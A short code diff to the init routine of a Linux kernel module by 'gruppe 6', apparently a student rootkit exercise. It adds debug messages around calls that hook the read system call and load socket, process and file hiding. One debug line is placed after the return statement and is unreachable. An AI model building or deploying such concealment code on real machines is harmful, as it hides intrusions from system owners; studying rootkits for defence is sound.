@@ -34,12 +34,16 @@ static int __init _init_module(void)
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
     init_commands();
     hook_read(handle_input);
+    OUR_DEBUG("Sockethiding initializer\n");
     load_sockethiding();
+    OUR_DEBUG("Processhiding initializer.\n");
     load_processhiding();
     // needed to initialize the whole file hiding thingy
+    OUR_DEBUG("Filehiding initializer.\n");
     hide_files();
     unhide_files();
     return 0;
+    OUR_DEBUG("Initialisation complete.\n");
 }
 
 /* Exiting routine */
